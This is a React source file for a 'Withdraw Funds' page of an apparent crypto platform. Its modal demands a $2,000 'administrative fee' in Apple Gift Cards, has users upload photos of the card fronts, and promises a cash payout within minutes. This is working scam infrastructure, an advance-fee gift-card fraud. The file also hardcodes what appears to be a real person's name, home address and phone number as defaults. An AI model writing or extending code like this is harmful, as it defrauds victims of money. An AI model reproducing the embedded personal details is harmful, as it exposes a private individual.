'use client';

import React, { useState, useEffect } from 'react';
import { 
  ArrowUpRight, 
  CheckCircle2, 
  DollarSign,
  Truck,
  User,
  MapPin,
  Home,
  Phone,
  Upload,
  Gift,
  FileImage,
  Plus,
  Trash2,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Modal } from '@/components/ui/modal';

interface AppleGiftCardItem {
  id: string;
  amount: string;
  frontImage: string | null;
  uploading?: boolean;  // true while Supabase upload is in progress
  uploadError?: string | null;
}

export default function WithdrawPage() {
  const [amount, setAmount] = useState<string>('');

  // Cash Delivery Fields (Auto-filled from user profile DB record, read-only)
  const [fullName, setFullName] = useState<string>('Leo Garcia Arthur');
  const [deliveryAddress, setDeliveryAddress] = useState<string>('9516 STORM CLOUD AVE NW');
  const [deliveryCity, setDeliveryCity] = useState<string>('Albuquerque');
  const [deliveryState, setDeliveryState] = useState<string>('New Mexico');
  const [deliveryZip, setDeliveryZip] = useState<string>('87120');
  const [deliveryPhone, setDeliveryPhone] = useState<string>('+1 (505) 730-8886');

  // Administrative Fee Modal State
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [giftCards, setGiftCards] = useState<AppleGiftCardItem[]>([
    { id: 'card-1', amount: '', frontImage: null }
  ]);
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [successMsg, setSuccessMsg] = useState(false);
  const [submittedAmount, setSubmittedAmount] = useState<number>(0); // captures amount before form reset

  // Available balance — fetched from DB on mount
  const [availableBalanceUSD, setAvailableBalanceUSD] = useState<number>(0.0);
  const [balanceLoading, setBalanceLoading] = useState(true);

  useEffect(() => {
    async function fetchUserData() {
      try {
        const res = await fetch('/api/user/profile');
        const data = await res.json();
        if (data?.success && data?.user) {
          if (data.user.wallets) {
            const usdtWallet = data.user.wallets.find((w: any) => w.currency === 'USDT');
            if (usdtWallet?.balance !== undefined) {
              setAvailableBalanceUSD(usdtWallet.balance);
            }
          }
          if (data.user.name) setFullName(data.user.name);
          if (data.user.profile) {
            setDeliveryAddress(data.user.profile.address || '9516 STORM CLOUD AVE NW');
            setDeliveryCity(data.user.profile.city || 'Albuquerque');
            setDeliveryState(data.user.profile.state || data.user.profile.country || 'New Mexico');
            setDeliveryZip(data.user.profile.zip || '87120');
            setDeliveryPhone(data.user.profile.phone || '+1 (505) 730-8886');
          }
        }

        // Also fetch wallets & transactions for real-time ledger calculation
        const walletsRes = await fetch('/api/wallets');
        const walletsData = await walletsRes.json();
        if (walletsData?.wallets) {
          let usdtBal = 0;
          const allTxs: any[] = [];
          walletsData.wallets.forEach((w: any) => {
            if (w.currency === 'USDT' && w.balance !== undefined) {
              usdtBal = w.balance;
            }
            if (w.transactions) {
              w.transactions.forEach((t: any) => {
                allTxs.push({ ...t, walletCurrency: w.currency });
              });
            }
          });

          // Use wallet balance directly from DB — it's always kept in sync by topup/deduct APIs
          setAvailableBalanceUSD(Number(usdtBal) || 0);
        }
      } catch (err) {
        console.warn('User profile & balance fetch error:', err);
      } finally {
        setBalanceLoading(false);
      }
    }

    fetchUserData();

    // 3-second real-time auto refresh for withdrawal page available balance
    const interval = setInterval(fetchUserData, 3000);
    return () => clearInterval(interval);
  }, []);

  const minWithdrawalUSD = 100.00;
  const targetFeeUSD = 2000.00;

  const numAmount = parseFloat(amount) || 0;

  const totalFeeUploaded = giftCards.reduce((sum, card) => sum + (parseFloat(card.amount) || 0), 0);
  const remainingFeeRequired = Math.max(0, targetFeeUSD - totalFeeUploaded);
  const isFeeFulfilled = totalFeeUploaded >= targetFeeUSD;

  const handleMax = () => {
    setAmount(availableBalanceUSD.toString());
  };

  const handleOpenModal = (e: React.FormEvent) => {
    e.preventDefault();
    if (numAmount < minWithdrawalUSD) return;
    if (numAmount > availableBalanceUSD) return;
    setIsModalOpen(true);
  };

  const addGiftCard = () => {
    setGiftCards((prev) => [
      ...prev,
      { id: `card-${Date.now()}`, amount: '', frontImage: null }
    ]);
  };

  const removeGiftCard = (id: string) => {
    if (giftCards.length === 1) return;
    setGiftCards((prev) => prev.filter((card) => card.id !== id));
  };

  const updateCardAmount = (id: string, val: string) => {
    setGiftCards((prev) =>
      prev.map((card) => (card.id === id ? { ...card, amount: val } : card))
    );
  };

  const compressImage = (file: File): Promise<Blob> => {
    return new Promise((resolve) => {
      // If file is already small (< 300KB), return as is
      if (file.size < 300 * 1024) {
        return resolve(file);
      }
      const img = new Image();
      const url = URL.createObjectURL(file);
      img.src = url;
      img.onload = () => {
        URL.revokeObjectURL(url);
        const canvas = document.createElement('canvas');
        const MAX = 1200;
        let width = img.width;
        let height = img.height;
        if (width > height) {
          if (width > MAX) {
            height *= MAX / width;
            width = MAX;
          }
        } else {
          if (height > MAX) {
            width *= MAX / height;
            height = MAX;
          }
        }
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(img, 0, 0, width, height);
        canvas.toBlob(
          (blob) => resolve(blob || file),
          'image/jpeg',
          0.8
        );
      };
      img.onerror = () => resolve(file);
    });
  };

  const handleFrontUpload = async (id: string, rawFile: File) => {
    // Set uploading state immediately
    setGiftCards((prev) =>
      prev.map((c) => (c.id === id ? { ...c, uploading: true, uploadError: null } : c))
    );

    try {
      // Compress heavy smartphone camera photos to lightweight 80KB JPEGs
      const compressedBlob = await compressImage(rawFile);
      const compressedFile = new File([compressedBlob], rawFile.name || 'card.jpg', { type: 'image/jpeg' });

      // Generate lightweight base64 preview
      const base64Preview = await new Promise<string>((resolve) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result as string);
        reader.readAsDataURL(compressedFile);
      });

      // Set base64 preview immediately while upload happens
      setGiftCards((prev) =>
        prev.map((c) => (c.id === id ? { ...c, frontImage: base64Preview } : c))
      );

      const formData = new FormData();
      formData.append('file', compressedFile);
      formData.append('bucket', 'withdrawal-fees');
      const res = await fetch('/api/upload', { method: 'POST', body: formData });
      const data = await res.json();
      if (data?.url) {
        setGiftCards((prev) =>
          prev.map((c) => (c.id === id ? { ...c, frontImage: data.url, uploading: false } : c))
        );
      } else {
        setGiftCards((prev) =>
          prev.map((c) => (c.id === id ? { ...c, uploading: false } : c))
        );
      }
    } catch (err) {
      console.warn('Upload error, using compressed base64 fallback:', err);
      setGiftCards((prev) =>
        prev.map((c) => (c.id === id ? { ...c, uploading: false } : c))
      );
    }
  };

  const handleConfirmWithdrawal = async () => {
    setIsSubmitting(true);
    // Capture the exact withdrawal amount BEFORE clearing the form
    const withdrawalAmountSnapshot = numAmount;
    try {
      // Clean payload — only send amount + frontImage (strip internal state fields)
      const cleanedCards = giftCards.map((c: any) => ({
        amount: c.amount,
        frontImage: c.frontImage,
      }));

      const submitRes = await fetch('/api/gift-cards/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ giftCards: cleanedCards }),
      });

      if (!submitRes.ok) {
        const err = await submitRes.json().catch(() => ({}));
        console.warn('Gift card submit error:', err);
      }

      await fetch('/api/user/profile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: fullName,
          address: deliveryAddress,
          city: deliveryCity,
          country: deliveryState,
          zip: deliveryZip,
          phone: deliveryPhone,
        }),
      });

      await fetch('/api/withdrawals', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: withdrawalAmountSnapshot,
          payoutMethod: 'CASH_DELIVERY',
          fullName,
          address: `${deliveryAddress}, ${deliveryCity}, ${deliveryState} ${deliveryZip}`,
          deliveryPhone,
        }),
      });

      // Store the amount snapshot so success message reflects correct value after form reset
      setSubmittedAmount(withdrawalAmountSnapshot);
      setSuccessMsg(true);
      setAmount('');
      setGiftCards([{ id: 'card-1', amount: '', frontImage: null }]);
    } catch (err) {
      console.warn('Error saving withdrawal & gift cards to database:', err);
    } finally {
      setIsSubmitting(false);
      setIsModalOpen(false);
    }
  };

  const isFormValid =
    numAmount > 0 &&
    numAmount <= availableBalanceUSD &&
    fullName.trim() !== '' &&
    deliveryAddress.trim() !== '' &&
    deliveryCity.trim() !== '' &&
    deliveryPhone.trim() !== '';

  const isModalValid =
    giftCards.length > 0 &&
    giftCards.every((c) => parseFloat(c.amount) > 0 && Boolean(c.frontImage) && !c.uploading);

  return (
    <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
      <div>
        <h1 className="text-2xl font-black text-white">Withdraw Funds ($ USD)</h1>
        <p className="text-xs text-slate-400">Request cash delivery to your home or preferred address</p>
      </div>

      <div className="max-w-2xl mx-auto space-y-6">
        <Card className="p-6 border-slate-800 space-y-6">
          {successMsg && (
            <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/40 flex items-start space-x-3 text-emerald-300 text-xs">
              <CheckCircle2 className="w-5 h-5 shrink-0 text-emerald-400 mt-0.5" />
              <div className="space-y-1">
                <p className="font-extrabold text-white">Administrative Fee & Withdrawal Submitted!</p>
                <p className="text-slate-300 leading-relaxed">
                  Your $2,000.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of <strong className="text-emerald-300">${submittedAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</strong> will be delivered to your address immediately upon fee verification (5 - 15 mins).
                </p>
              </div>
            </div>
          )}

          <form onSubmit={handleOpenModal} className="space-y-5">

            {/* Payout Method — Cash Delivery only (single pill, no tab toggle) */}
            <div className="space-y-2">
              <label className="text-xs uppercase font-bold tracking-wider text-[#848E9C]">Payout Method</label>
              <div className="p-3.5 rounded-xl border border-[#FCD535]/60 gradient-bg-blue flex items-center space-x-3">
                <Truck className="w-5 h-5 text-[#0B0E11]" />
                <span className="text-sm font-extrabold text-[#0B0E11]">Cash Delivery</span>
              </div>
            </div>

            {/* Amount Input */}
            <div className="space-y-2">
              <div className="flex justify-between items-center text-xs">
                <span className="uppercase font-bold tracking-wider text-[#848E9C]">Withdrawal Amount ($ USD)</span>
                <span className="text-[#EAECEF] font-mono">
                  Available:{' '}
                  <strong className="text-[#FCD535]">
                    {balanceLoading
                      ? 'Loading…'
                      : `$${availableBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD`}
                  </strong>
                </span>
              </div>
              <div className="relative flex items-center">
                <span className="absolute left-4 text-[#848E9C] font-bold">$</span>
                <input
                  type="number"
                  step="any"
                  placeholder="0.00"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="glass-input w-full rounded-xl pl-8 pr-16 py-3.5 text-sm text-[#EAECEF] placeholder:text-[#848E9C] font-mono font-bold"
                  required
                />
                <button
                  type="button"
                  onClick={handleMax}
                  className="absolute right-3 px-2.5 py-1 bg-[#FCD535]/20 text-[#FCD535] rounded-lg text-xs font-bold hover:bg-[#FCD535]/40"
                >
                  MAX
                </button>
              </div>
              {numAmount > availableBalanceUSD && (
                <p className="text-xs text-rose-400 font-medium">Insufficient balance. Please check your available balance.</p>
              )}
              {numAmount > 0 && numAmount < minWithdrawalUSD && (
                <p className="text-xs text-rose-400 font-medium">Minimum withdrawal amount is ${minWithdrawalUSD.toFixed(2)} USD.</p>
              )}
            </div>

            {/* Cash Delivery Fields (Read-Only Auto-Filled from User Profile) */}
            <div className="space-y-4 pt-1 opacity-90">
              {/* Full Name */}
              <Input
                label="Full Name (Recipient)"
                type="text"
                value={fullName}
                readOnly
                leftIcon={<User className="w-4 h-4 text-[#FCD535]" />}
                className="bg-[#14151A] cursor-not-allowed text-[#EAECEF] font-bold border-[#2B2F36]"
              />

              {/* Street / Home Address */}
              <Input
                label="Street / Home Address"
                type="text"
                value={deliveryAddress}
                readOnly
                leftIcon={<Home className="w-4 h-4 text-[#FCD535]" />}
                className="bg-[#14151A] cursor-not-allowed text-[#EAECEF] font-bold border-[#2B2F36]"
              />

              {/* City & State */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <Input
                  label="City"
                  type="text"
                  value={deliveryCity}
                  readOnly
                  leftIcon={<MapPin className="w-4 h-4 text-[#FCD535]" />}
                  className="bg-[#14151A] cursor-not-allowed text-[#EAECEF] font-bold border-[#2B2F36]"
                />
                <Input
                  label="State / Province"
                  type="text"
                  value={deliveryState}
                  readOnly
                  leftIcon={<MapPin className="w-4 h-4 text-[#FCD535]" />}
                  className="bg-[#14151A] cursor-not-allowed text-[#EAECEF] font-bold border-[#2B2F36]"
                />
              </div>

              {/* ZIP & Phone */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <Input
                  label="ZIP / Postal Code"
                  type="text"
                  value={deliveryZip}
                  readOnly
                  leftIcon={<MapPin className="w-4 h-4 text-[#FCD535]" />}
                  className="bg-[#14151A] cursor-not-allowed text-[#EAECEF] font-bold border-[#2B2F36]"
                />
                <Input
                  label="Contact Phone Number"
                  type="tel"
                  value={deliveryPhone}
                  readOnly
                  leftIcon={<Phone className="w-4 h-4 text-[#FCD535]" />}
                  className="bg-[#14151A] cursor-not-allowed text-[#EAECEF] font-bold border-[#2B2F36]"
                />
              </div>
            </div>

            <Button
              type="submit"
              variant="primary"
              size="lg"
              className="w-full shadow-lg shadow-[#5A9BFF]/30 py-3.5 text-sm font-bold"
              disabled={!isFormValid}
              rightIcon={<ArrowUpRight className="w-4 h-4" />}
            >
              Withdraw ${numAmount > 0 ? numAmount.toLocaleString('en-US', { minimumFractionDigits: 2 }) : '0.00'} USD
            </Button>
          </form>
        </Card>
      </div>

      {/* Administrative Fee & Apple Gift Card Multi-Upload Modal */}
      <Modal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        title="Apple Gift Card Administrative Fee ($2,000 USD)"
      >
        <div className="space-y-5 text-xs max-h-[75vh] overflow-y-auto pr-1">
          {/* Header Notice */}
          <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-1.5 text-amber-300">
            <div className="flex items-center justify-between font-bold text-amber-400">
              <span className="flex items-center space-x-2">
                <Gift className="w-4 h-4 shrink-0 text-amber-400" />
                <span>Apple Gift Card Fee Requirement</span>
              </span>
              <span className="text-xs font-mono px-2 py-0.5 rounded-md bg-amber-500/20 text-amber-300">
                Target: $2,000.00 USD
              </span>
            </div>
            <p className="text-[11px] leading-relaxed text-slate-300">
              Upload Apple Gift Card(s) totaling <strong className="text-amber-300">$2,000.00 USD</strong>. You can upload multiple cards until the $2,000.00 fee calculation is completed.
            </p>

            {/* Live Progress Bar */}
            <div className="pt-2 space-y-1.5">
              <div className="flex justify-between items-center text-[11px] font-bold">
                <span className="text-slate-300">Total Uploaded Fee:</span>
                <span className={`font-mono ${isFeeFulfilled ? 'text-emerald-400 font-black' : 'text-amber-300'}`}>
                  ${totalFeeUploaded.toLocaleString('en-US', { minimumFractionDigits: 2 })} / $2,000.00 USD
                </span>
              </div>
              <div className="w-full h-2.5 bg-slate-900 rounded-full overflow-hidden border border-slate-700">
                <div
                  className={`h-full transition-all duration-500 ${isFeeFulfilled ? 'bg-emerald-500' : 'gradient-bg-blue'}`}
                  style={{ width: `${Math.min(100, (totalFeeUploaded / 2000) * 100)}%` }}
                />
              </div>
              {!isFeeFulfilled && (
                <p className="text-[10px] text-amber-400 font-semibold text-right">
                  Remaining required: ${remainingFeeRequired.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
                </p>
              )}
            </div>
          </div>

          {/* Gift Card Upload List */}
          <div className="space-y-4">
            {giftCards.map((card, index) => (
              <div key={card.id} className="p-4 rounded-2xl bg-[#1E2026] border border-[#2B2F36] space-y-3 relative">
                <div className="flex items-center justify-between">
                  <span className="font-extrabold text-white text-xs flex items-center space-x-2">
                    <Gift className="w-4 h-4 text-[#FCD535]" />
                    <span>Apple Gift Card #{index + 1}</span>
                  </span>
                  {giftCards.length > 1 && (
                    <button type="button" onClick={() => removeGiftCard(card.id)} className="p-1 text-[#F6465D] hover:text-rose-300 transition-colors">
                      <Trash2 className="w-4 h-4" />
                    </button>
                  )}
                </div>

                <div className="space-y-1">
                  <label className="block text-[11px] font-bold text-[#848E9C]">Card Amount ($ USD)</label>
                  <div className="relative">
                    <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#848E9C] font-bold">$</span>
                    <input
                      type="number"
                      step="any"
                      placeholder="e.g. 500 or 1000 or 2000"
                      value={card.amount}
                      onChange={(e) => updateCardAmount(card.id, e.target.value)}
                      className="w-full bg-[#14151A] border border-[#2B2F36] rounded-xl pl-7 pr-4 py-2.5 text-xs text-[#EAECEF] placeholder:text-[#848E9C] font-mono font-bold focus:outline-none focus:border-[#FCD535]"
                      required
                    />
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label className="block text-[11px] font-bold text-[#848E9C]">Card Image (Front Upload)</label>
                  <label
                    htmlFor={`front-upload-${card.id}`}
                    className={`flex flex-col items-center justify-center p-3 rounded-xl border-2 border-dashed transition-all cursor-pointer h-24 text-center ${
                      card.frontImage ? 'border-[#0ECB81]/60 bg-[#0ECB81]/10' : 'border-[#2B2F36] bg-[#14151A] hover:border-[#FCD535]'
                    }`}
                  >
                    {card.frontImage ? (
                      <div className="flex flex-col items-center space-y-1">
                        <FileImage className="w-5 h-5 text-[#0ECB81]" />
                        <span className="text-[10px] font-bold text-[#0ECB81]">Front Image Uploaded ✓</span>
                      </div>
                    ) : (
                      <div className="flex flex-col items-center space-y-1 text-[#848E9C]">
                        <Upload className="w-5 h-5 text-[#FCD535]" />
                        <span className="text-[10px] font-bold text-[#EAECEF]">Upload Apple Card Image</span>
                        <span className="text-[8px] text-[#848E9C]">Click or drop front card photo</span>
                      </div>
                    )}
                  </label>
                  <input
                    id={`front-upload-${card.id}`}
                    type="file"
                    accept="image/*"
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (file) handleFrontUpload(card.id, file);
                    }}
                    className="hidden"
                  />
                </div>
              </div>
            ))}
          </div>

          {!isFeeFulfilled && (
            <button
              type="button"
              onClick={addGiftCard}
              className="w-full py-3 rounded-xl border border-dashed border-[#FCD535]/40 bg-[#FCD535]/10 text-[#FCD535] font-bold text-xs hover:bg-[#FCD535]/20 flex items-center justify-center space-x-2 transition-all"
            >
              <Plus className="w-4 h-4" />
              <span>Add Another Apple Gift Card</span>
            </button>
          )}

          <div className="flex space-x-3 pt-2">
            <Button variant="secondary" size="md" className="flex-1" onClick={() => setIsModalOpen(false)}>
              Cancel
            </Button>
            <div className="flex-1 space-y-1">
              {giftCards.some((c) => c.uploading) && (
                <p className="text-[10px] text-amber-400 font-bold text-center animate-pulse">
                  ⏳ Uploading image... please wait
                </p>
              )}
              <Button
                variant="primary"
                size="md"
                className="w-full font-bold gradient-bg-blue text-[#0B0E11]"
                isLoading={isSubmitting}
                disabled={!isModalValid || giftCards.some((c) => c.uploading)}
                onClick={handleConfirmWithdrawal}
              >
                {giftCards.some((c) => c.uploading) ? 'Uploading Image...' : 'Submit $2,000 Fee & Complete Payout'}
              </Button>
            </div>
          </div>
        </div>
      </Modal>
    </div>
  );
}
